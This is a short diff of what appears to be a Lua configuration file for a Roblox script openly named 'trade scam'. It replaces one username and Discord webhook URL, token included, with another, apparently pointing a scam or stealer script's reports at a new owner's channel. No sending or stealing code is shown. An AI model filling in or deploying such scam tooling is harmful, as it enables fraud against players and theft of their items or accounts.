@@ -1,5 +1,5 @@
-Username = "Danil124509"
-WebHook = "https://discord.com/api/webhooks/1081457786661113876/l90y6dZFDWq1sZQujv6DXzpUYuzhmBjY5hhm7GT8gRc0kNLq-CkbqhwFtefxgc-r5FiU"
+Username = "maftipr"
+WebHook = "https://discord.com/api/webhooks/1103187275736686592/gdGXRPCjyu2bIX78gjW17TvFsZDZhl1P8HWzpNOiPvOPCNSKZWZGQeKM95HXgn1eyeq7"
 
 _G.CustomScriptName = "trade scam"
 _G.Text1 = "Script Loaded..."
